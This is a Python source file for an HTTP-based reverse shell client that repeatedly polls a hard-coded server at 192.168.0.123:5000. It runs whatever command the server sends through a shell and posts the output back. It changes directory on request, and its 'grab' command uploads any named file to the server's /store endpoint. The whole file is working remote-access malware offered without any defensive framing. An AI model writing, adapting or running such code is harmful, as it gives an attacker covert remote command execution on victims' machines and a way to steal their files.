
import requests as req 
from subprocess import Popen, PIPE
from time import sleep
import os

class WebClient:
    def __init__(self):
        self.SERVER_IP = '192.168.0.123'
        self.SERVER_PORT = 5000
    
    def run(self):
        while True: 
            # Send GET request to server
            get_req = req.get(f'http://{self.SERVER_IP}:{self.SERVER_PORT}') 
            # store received txt into command variable
            command = get_req.text 
            if 'terminate' in command:
                break 
            elif 'cd' in command:
                cur_path = os.getcwd()
                com, directory = command.split()
                new_path = f"{cur_path}\\{directory}"
                try: 
                    os.chdir(new_path)
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=b"Directory changed." ) 
                except Exception as e:
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=str(e).encode() ) 
            elif 'grab' in command:
                path = command.split()[-1] 
                if os.path.exists(path): 
                    # Appended /store in the URL
                    url = f'http://{self.SERVER_IP}:{self.SERVER_PORT}/store'
                    
                    files = {'filename':path, 'file': open(path, 'rb')} 
                    # Send the file, requests use POST method called "multipart/form-data"
                    r = req.post(url, files=files) 
                else:
                    post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data='[!] File not found.' )
            else:
                cmd = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
                # POST results
                post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=cmd.stdout.read() ) 
                # or error 
                post_response = req.post(url=f'http://{self.SERVER_IP}:{self.SERVER_PORT}', data=cmd.stdout.read() )

            # sleep(3)

def main():
    w = WebClient()
    w.run()
  

if __name__ == "__main__":
    main()